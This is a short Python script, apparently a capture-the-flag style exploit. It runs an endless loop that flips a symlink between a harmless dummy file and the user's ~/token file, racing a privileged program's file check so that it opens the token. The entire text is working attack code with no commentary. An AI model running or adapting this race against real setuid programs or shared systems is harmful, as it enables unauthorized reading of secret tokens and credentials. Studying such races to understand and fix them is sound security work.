import os

os.system('echo aa > file')
while 1:
	os.system('ln -sf file link')
	os.system('ln -sf ~/token link')
